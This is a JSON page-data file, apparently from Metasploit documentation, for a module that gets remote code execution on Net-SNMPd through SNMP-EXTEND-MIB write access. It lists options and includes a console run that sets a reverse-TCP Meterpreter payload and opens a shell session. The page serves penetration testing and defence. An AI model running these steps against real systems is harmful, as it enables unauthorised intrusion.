{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/snmp/net_snmpd_rw_access","result":{"data":{"moduleMetadataJson":{"id":"9a206930-bc95-596f-9d6b-d3e50737ac52","name":"Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution","fullname":"exploit/linux/snmp/net_snmpd_rw_access","description":"This exploit module exploits the SNMP write access configuration ability of SNMP-EXTEND-MIB to\n            configure MIB extensions and lead to remote code execution.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/linux/snmp/net_snmpd_rw_access","documentationSlug":"/modules/documentation/exploit/linux/snmp/net_snmpd_rw_access","referencesSlug":"/modules/references/exploit/linux/snmp/net_snmpd_rw_access"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module uses SNMP extension MIBs to enable remote code execution on the Linux Net-SNMPD servers using the\nSNMP-EXTEND-MIB.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/linux/snmp/net_snmpd_rw_access</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">set community [SNMP Community]</code></li>\n<li>Do: <code class=\"language-text\">set version [SNMP Version]</code></li>\n<li>Configure the payload</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>FILEPATH</strong><br>\nThe location to write the executable out to on the target. Needs to be writable by the SNMP service user. This defaults to /tmp.  </p>\n<p>  <strong>COMMUNITY</strong><br>\nThe read/write community string of the target Net-SNMP service.</p>\n<p>  <strong>VERSION</strong><br>\nThe SNMP protocol version. Accepted values are '1' or '2c'. </p>\n<p>  <strong>CHUNKSIZE</strong><br>\nThe maximum amount of payload bytes to write in a single operation. This value was found through experimentation and may not be suitable in all environments, but should hopefully work for all cmdstager flavors<br>\nNote that cmdstager payloads are modified to allow further escaping, so the values limits may also change between cmdstager flavors.<br>\nThis is possibly related to the following bug: [https://sourceforge.net/p/net-snmp/bugs/2542/].</p>\n<p>  <strong>TIMEOUT</strong><br>\nSpecifies the maximum time to allow SNMP to timeout.  </p>\n<p>  <strong>SHELL</strong><br>\nThe shell to call for the client. Defaults to '/bin/bash'  </p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/snmp/net_snmpd_rw_access \nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; set payload linux/x86/meterpreter/reverse_tcp\npayload =&gt; linux/x86/meterpreter/reverse_tcp\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; set rhost 192.168.1.3\nrhost =&gt; 192.168.1.3\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; set lhost 192.168.1.2\nlhost =&gt; 192.168.1.2\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; set community private\ncommunity =&gt; private\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; set version 2c\nversion =&gt; 2c\n\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; show info\n\n       Name: Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution\n     Module: exploit/linux/snmp/net_snmpd_rw_access\n   Platform: \n       Arch: \n Privileged: No\n    License: Metasploit Framework License (BSD)\n       Rank: Normal\n\nProvided by:\n  Steve Embling at InteliSecure\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Linux x86\n\nBasic options:\n  Name       Current Setting  Required  Description\n  ----       ---------------  --------  -----------\n  CHUNKSIZE  200              yes       Maximum bytes of payload to write at once \n  COMMUNITY  private          yes       SNMP Community String\n  FILEPATH   /tmp             yes       file path to write to \n  RETRIES    1                yes       SNMP Retries\n  RHOST      192.168.1.3      yes       The target address\n  RPORT      161              yes       The target port (TCP)\n  SHELL      /bin/bash        yes       Shell to call with -c argument\n  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n  SRVPORT    8080             yes       The local port to listen on.\n  SSL        false            no        Negotiate SSL for incoming connections\n  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n  TIMEOUT    1                yes       SNMP Timeout\n  URIPATH                     no        The URI to use for this exploit (default is random)\n  VERSION    2c               yes       SNMP Version &lt;1/2c&gt; \n\nPayload information:\n  Space: 4096\n\nDescription:\n  This exploit module exploits the SNMP write access configuration \n  ability of SNMP-EXTEND-MIB to configure MIB extensions and lead to \n  remote code execution.\n\nReferences:\n  https://www.intelisecure.com\n\nmsf exploit(linux/snmp/net_snmpd_rw_access) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.2:4444 \n[*] Command Stager progress -   1.11% done (199/17924 bytes)\n[*] Command Stager progress -   2.23% done (399/17924 bytes)\n[*] Command Stager progress -   3.34% done (598/17924 bytes)\n[*] Command Stager progress -   4.45% done (797/17924 bytes)\n... Redacted ...\n[*] Command Stager progress -  98.64% done (17681/17924 bytes)\n[*] Command Stager progress -  99.72% done (17873/17924 bytes)\n[*] Sending stage (857352 bytes) to 192.168.1.3\n[*] Meterpreter session 31 opened (192.168.1.2:4444 -&gt; 192.168.1.3:54232) at 2018-02-14 17:30:22 +0000\n[+] SNMP request timeout (this is promising).\n[*] Command Stager progress - 100.00% done (18022/18022 bytes)\n\n\nmeterpreter &gt; getuid\nServer username: uid=121, gid=129, euid=121, egid=129\nmeterpreter &gt; exit\n[*] 192.168.1.3 - Meterpreter session 30 closed.  Reason: User exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9a206930-bc95-596f-9d6b-d3e50737ac52"}}}